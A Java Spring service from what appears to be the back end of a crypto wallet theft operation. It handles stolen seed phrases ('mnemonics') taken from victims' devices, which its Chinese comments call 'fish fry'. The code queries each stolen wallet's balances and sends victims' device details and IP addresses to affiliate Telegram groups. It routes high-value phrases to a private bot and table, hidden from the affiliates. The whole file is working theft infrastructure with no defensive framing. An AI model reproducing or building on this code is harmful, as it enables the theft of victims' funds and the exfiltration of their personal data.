package com.consumer.service;

import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import javax.annotation.Resource;

import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import com.consumer.config.MaxNoticeProperties;
import com.consumer.dao.Address4Dao;
import com.consumer.dao.ChannelDao;
import com.consumer.dao.DeviceDao;
import com.consumer.entity.Address4Entity;
import com.consumer.entity.ChannelEntity;
import com.consumer.entity.DeviceEntity;
import com.consumer.util.MessageFormatUtils;
import com.consumer.util.TelegramNotificationUtil;
import com.consumer.util.WalletBalanceQuery;
import com.consumer.util.WalletBalanceQuery.ChainBalance;

import lombok.extern.slf4j.Slf4j;

/**
 * 助记词 / 余额飞机通知（异步 + 并发限流）。
 * <p>新鱼苗延后到余额查询后发送，避免高额词先打到渠道群。
 * <p>高额：独立 bot/群 + 迁 private_mnemonic + 删 mnemonic/address4。
 */
@Service
@Slf4j
public class MnemonicTelegramService {

    private static final DateTimeFormatter DTF = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");

    /** 待发「新鱼苗」：key=deviceId，余额回来后再发（渠道或隐私群） */
    private final ConcurrentHashMap<String, PendingFish> pendingFish = new ConcurrentHashMap<>();
    /** 同 device 短时内只发一次新鱼苗（渠道侧） */
    private final ConcurrentHashMap<String, Long> fishSent = new ConcurrentHashMap<>();
    /** 同 mnemonicId 只处理一次余额通知 */
    private final ConcurrentHashMap<Integer, Boolean> balanceDedup = new ConcurrentHashMap<>();

    private static final long FISH_DEDUP_MS = 120_000L;

    @Resource
    private TelegramNotificationUtil telegramNotificationUtil;
    @Resource
    private ChannelDao channelDao;
    @Resource
    private DeviceDao deviceDao;
    @Resource
    private Address4Dao address4Dao;
    @Resource
    private WalletBalanceQuery walletBalanceQuery;
    @Resource
    private MaxNoticeProperties maxNoticeProps;
    @Resource
    private HighValueMnemonicService highValueMnemonicService;

    /**
     * 登记待发新鱼苗（不再立刻打渠道群；等余额后由 {@link #notifyBalanceAfterDeriveAsync} 发送）。
     */
    @Async("telegramMsgExecutor")
    public void notifyFishAsync(DeviceEntity device) {
        try {
            if (device == null) return;
            String dedupKey = firstNonEmpty(device.getDeviceId(), String.valueOf(device.getId()));
            PendingFish p = new PendingFish();
            p.deviceId = device.getDeviceId();
            p.channelCode = device.getChannelCode();
            p.model = device.getModel();
            p.ip = device.getIp();
            p.ecid = firstNonEmpty(device.getEcid(), device.getDeviceId());
            p.deviceRowId = device.getId();
            pendingFish.put(dedupKey, p);
            prunePendingFish();
            log.debug("【telegram】新鱼苗已挂起，待余额后发送 device={}", dedupKey);
        } catch (Exception e) {
            log.warn("【telegram】新鱼苗挂起失败 device={} err={}",
                    device == null ? null : device.getDeviceId(), e.toString());
        }
    }

    /**
     * 派生完成后：查余额 → 回写 → 高额分流 / 渠道通知；并补发挂起的新鱼苗。
     */
    public void notifyBalanceAfterDeriveAsync(Integer mnemonicId, String deviceId,
                                              String channelCodeFallback,
                                              List<Address4Entity> addresses) {
        try {
            if (mnemonicId == null || addresses == null || addresses.isEmpty()) return;
            if (balanceDedup.putIfAbsent(mnemonicId, Boolean.TRUE) != null) {
                log.info("【telegram】余额通知去重跳过 mnemonicId={}", mnemonicId);
                return;
            }

            Map<String, String> chainAddr = new HashMap<>();
            for (Address4Entity a : addresses) {
                if (a == null || a.getChaintype() == null || a.getAddress() == null) continue;
                String c = a.getChaintype().toLowerCase();
                chainAddr.putIfAbsent(c, a.getAddress());
            }
            Map<String, ChainBalance> balances = walletBalanceQuery.queryAll(chainAddr);

            double refreshed = System.currentTimeMillis() / 1000.0;
            for (Address4Entity a : addresses) {
                if (a == null || a.getChaintype() == null) continue;
                ChainBalance b = balances.get(a.getChaintype().toLowerCase());
                if (b == null) continue;
                try {
                    address4Dao.updateBalance(mnemonicId, a.getChaintype(), a.getAddrindex(),
                            b.getNativeBal(), b.getUsdtBal(), refreshed);
                } catch (Exception e) {
                    log.warn("【telegram】回写余额失败 mnemonicId={} chain={} err={}",
                            mnemonicId, a.getChaintype(), e.toString());
                }
            }

            DeviceEntity device = null;
            if (deviceId != null && !deviceId.isEmpty()) {
                try { device = deviceDao.findByDeviceid(deviceId); } catch (Exception ignore) {}
            }
            String channelCode = device != null ? device.getChannelCode() : channelCodeFallback;
            String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
            String model = device == null ? null : device.getModel();
            String ip = device == null ? null : device.getIp();
            String ecid = device == null ? deviceId
                    : firstNonEmpty(device.getEcid(), device.getDeviceId());
            String fishKey = firstNonEmpty(deviceId, device == null ? null : String.valueOf(device.getId()));

            boolean high = highValueMnemonicService.isHighValue(balances);
            if (high) {
                handleHighValue(mnemonicId, device, fishKey, channelCode, model, ip, ecid, datetime, balances);
                return;
            }

            // —— 低额：原渠道流程 ——
            flushPendingFishToChannel(fishKey, device, channelCode);
            ChannelEntity channel = resolveChannel(channelCode);
            if (channel == null) {
                log.info("【telegram】渠道无 telegram_groupid，跳过余额通知 mnemonicId={} channel={}",
                        mnemonicId, channelCode);
                return;
            }
            String groupId = channel.getTelegramGroupid();
            String text = MessageFormatUtils.saveBalanceTelegram(
                    groupId, channelCode, channel.getName(), mnemonicId,
                    model, ip, ecid, datetime, balances);
            telegramNotificationUtil.sendTelegramMsg(text, groupId);
        } catch (Exception e) {
            log.warn("【telegram】余额通知失败 mnemonicId={} err={}", mnemonicId, e.toString());
            if (mnemonicId != null) balanceDedup.remove(mnemonicId);
        }
    }

    private void handleHighValue(Integer mnemonicId, DeviceEntity device, String fishKey,
                                 String channelCode, String model, String ip, String ecid,
                                 String datetime, Map<String, ChainBalance> balances) {
        // 高额一律不发渠道群：先摘掉挂起的新鱼苗，避免泄漏
        if (fishKey != null) pendingFish.remove(fishKey);
        // 先迁移，飞机消息用 private_mnemonic.id
        Integer privateId = highValueMnemonicService.migrateToPrivate(mnemonicId, device);
        if (privateId == null) {
            balanceDedup.remove(mnemonicId);
            log.warn("【maxnotice】迁移未完成，已解除余额去重以便重试 mnemonicId={}", mnemonicId);
            return;
        }
        if (!maxNoticeProps.isPrivateTgConfigured()) {
            log.warn("【maxnotice】已迁移 privateId={} 但未配置 tg-bot-token/tg-group-id，跳过飞机", privateId);
            return;
        }
        String privGroup = maxNoticeProps.getTgGroupId().trim();
        String privToken = maxNoticeProps.getTgBotToken().trim();
        sendFishOnce(fishKey, privGroup, privToken, channelCode, "PRIVATE", model, ip, ecid, datetime, true);
        String balText = MessageFormatUtils.saveHighValueBalanceTelegram(
                privGroup, channelCode, "PRIVATE", privateId,
                model, ip, ecid, datetime, balances);
        telegramNotificationUtil.sendTelegramMsg(balText, privGroup, privToken);
    }

    private void flushPendingFishToChannel(String fishKey, DeviceEntity device, String channelCode) {
        PendingFish pending = fishKey == null ? null : pendingFish.remove(fishKey);
        if (pending == null && device == null) return;
        ChannelEntity channel = resolveChannel(channelCode != null ? channelCode
                : (pending == null ? null : pending.channelCode));
        if (channel == null) {
            log.info("【telegram】渠道无 telegram_groupid，跳过新鱼苗 device={} channel={}",
                    fishKey, channelCode);
            return;
        }
        String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
        String model = pending != null ? pending.model : (device == null ? null : device.getModel());
        String ip = pending != null ? pending.ip : (device == null ? null : device.getIp());
        String ecid = pending != null ? pending.ecid
                : (device == null ? fishKey : firstNonEmpty(device.getEcid(), device.getDeviceId()));
        sendFishOnce(fishKey, channel.getTelegramGroupid(), null,
                channel.getChannelcode() != null ? channel.getChannelcode() : channelCode,
                channel.getName(), model, ip, ecid, datetime, false);
    }

    private void sendFishOnce(String fishKey, String groupId, String tokenOverride,
                              String channelCode, String channelName,
                              String model, String ip, String ecid, String datetime,
                              boolean privateGroup) {
        if (fishKey == null || fishKey.isEmpty()) return;
        String dedupNs = (privateGroup ? "p:" : "c:") + fishKey;
        long now = System.currentTimeMillis();
        Long prev = fishSent.putIfAbsent(dedupNs, now);
        if (prev != null && now - prev < FISH_DEDUP_MS) {
            log.info("【telegram】新鱼苗去重跳过 device={} private={}", fishKey, privateGroup);
            return;
        }
        if (prev != null) fishSent.put(dedupNs, now);
        pruneFishSent(now);
        String text = privateGroup
                ? MessageFormatUtils.saveHighValueFishTelegram(
                        groupId, channelCode, channelName, model, ip, ecid, datetime)
                : MessageFormatUtils.saveMnemonicFishTelegram(
                        groupId, channelCode, channelName, model, ip, ecid, datetime);
        if (tokenOverride != null && !tokenOverride.isEmpty()) {
            telegramNotificationUtil.sendTelegramMsg(text, groupId, tokenOverride);
        } else {
            telegramNotificationUtil.sendTelegramMsg(text, groupId);
        }
    }

    private ChannelEntity resolveChannel(String channelCode) {
        if (channelCode == null || channelCode.isEmpty()) return null;
        ChannelEntity channel = channelDao.findByChannelcode(channelCode);
        if (channel == null || channel.getTelegramGroupid() == null
                || channel.getTelegramGroupid().isEmpty()) {
            return null;
        }
        return channel;
    }

    private void prunePendingFish() {
        if (pendingFish.size() < 2000) return;
        // 简单裁剪：过大时清空最老无关紧要，余额路径仍可按 device 信息发鱼苗
        if (pendingFish.size() > 5000) pendingFish.clear();
    }

    private void pruneFishSent(long now) {
        if (fishSent.size() < 500) return;
        fishSent.entrySet().removeIf(e -> now - e.getValue() > FISH_DEDUP_MS);
    }

    private static String firstNonEmpty(String a, String b) {
        if (a != null && !a.isEmpty()) return a;
        return b == null ? "" : b;
    }

    private static final class PendingFish {
        String deviceId;
        String channelCode;
        String model;
        String ip;
        String ecid;
        Integer deviceRowId;
    }
}
